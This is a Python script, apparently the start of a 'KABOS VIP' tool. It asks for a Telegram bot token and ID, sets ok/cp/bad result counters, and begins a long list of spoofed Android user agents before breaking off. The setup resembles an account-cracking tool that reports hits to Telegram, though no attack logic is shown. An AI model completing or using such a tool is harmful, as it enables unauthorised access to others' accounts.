import pyfiglet
from os import path
import requests
import re
from time import sleep
import random
import os,base64,zlib,pip,urllib,time
print('[\033[1;32m✓\033[1;37m] Checking For Update !! ')
print('[\033[1;32m✓\033[1;37m] Wait For Update Tool !! ')
sleep(1)
#----------------------------------------------------
F = '''[2;32m'''
Z = '''[1;31m'''
L = '''[1;95m'''
E = '''[1;31m'''
G = '''[1;32m'''
S = '''[1;33m'''
Z = '''[1;31m'''
X = '''[1;33m'''
Z1 = '''[2;31m'''
F = '''[2;32m'''
A = '''[2;39m'''
C = '''[2;35m'''
B = '''[2;36m'''
Y = '''[1;34m'''
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[0;34m'  # أزرق سماوي
xxh = '\x1b[38;5;208m'#برتقالي
r1='\x1b[38;5;8m'#رمادي
e1='\x1b[38;5;196m'#احمر
w1='\x1b[38;5;225m'#وردي فاتح جدا
t1='\x1b[38;5;92m'#بنفسجي غامق
y1='\x1b[1;93m'#اصفر نيون
u1='\x1b[1;38;5;203m'#وردي لطيف
i1='\x1b[1;38;5;121m'#اخضر نيون
o1='\x1b[1;96m'#ازرق سماوي
p1='\x1b[38;5;205m'#وردي فاتح
a1u='\x1b[38;5;161m'#وردي جميل جدا
#----------------------------------------------------
os.system('git pull')
os.system('clear')

print('[\033[1;32m✓\033[1;37m] Update Done \033[1;32m✓\033[1;37m Now You Can Use This Tool :) ')

os.system('clear')

time1 = time.localtime()

time2 = time.strftime('''%d/%m/%Y''')

print('')

time3 = time.strftime('''%H:%M:%S''')

print('')

print(f'''                  \x1b[1;93m  ༺   \x1b[1;38;5;121m  𝐾𝐴𝐵𝑂𝑆 𝑉𝐼𝑃 \x1b[1;93m  ༻  ''')

print('')

print(f'''             {C}: \x1b[38;5;92m 𝐓𝐇𝐄 𝐃𝐀𝐓𝐄 \x1b[1;38;5;121m ๛   \x1b[1;38;5;121m   𖣎 \x1b[1;96m{time2} \x1b[1;38;5;121m 𖣎''')

print('')

print(f'''              {C}: \x1b[38;5;92m 𝑇𝐻𝐸 𝑇𝐼𝑀𝐸 \x1b[1;38;5;121m ๛   \x1b[1;38;5;121m   𖣎 \x1b[1;96m{time3} \x1b[1;38;5;121m 𖣎''')

print('\n                  \033[0m\033[1;93m [\033[1;92m\033[1;44m  𝐓𝐇𝐄 𝐏𝐑𝐎𝐆𝐑𝐀𝐌𝐌𝐄𝐑     \033[0m\033[1;93m]\n')

print (a23+'_'*63)

print (f'                           {a3}َ𝑇{a5}𝑂{a7}𝐾{a9}𝐸{a20}𝑁  : \f')

token = input ('[•] : ')

print ('\n')
print (a23+'_'*63)
print ('\n')

print (f'                       {a23} 𝐼{a16}𝐷 {a22}َ𝑇𝐸𝐿𝐸{a28}𝐺𝑅𝐴𝑀 {a22} : \f')

ID = input('[•] : ')

print ('_'*63)
print ('\n')

ok = 0
cp = 0
bad = 0

ugen=['Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Xiaomi Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; OnePlus 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S21 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy Note 20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Google Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 13.0; Samsung Galaxy S10) AppleWebKit/537.36 